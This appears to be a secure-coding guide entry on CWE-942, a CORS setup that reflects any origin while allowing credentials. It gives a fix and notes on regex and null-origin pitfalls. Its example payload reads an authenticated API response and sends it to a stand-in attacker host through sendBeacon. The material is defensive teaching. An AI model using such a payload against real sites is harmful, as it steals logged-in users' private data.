---
order: 9
cwe: 942
title: CORS reflecting any origin
category: session
severity: critical
sink: |-
    Access-Control-Allow-Origin: <request Origin> + Allow-Credentials: true
payload: |-
    fetch("https://api.example/me", { credentials: "include" })
      .then((r) => r.text())
      .then((me) => navigator.sendBeacon("//evil.sh", me))
fix: |
    const allowed = new Set(["https://app.example"]);
    if (allowed.has(origin)) res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Vary", "Origin");
refs:
    - https://portswigger.net/web-security/cors
---

Echoing the `Origin` header with credentials allowed lets any website read authenticated API responses as the logged-in user. Also watch for regexes like `/example\.com$/` (matches `evilexample.com`) and trusting the `null` origin, which sandboxed iframes send.
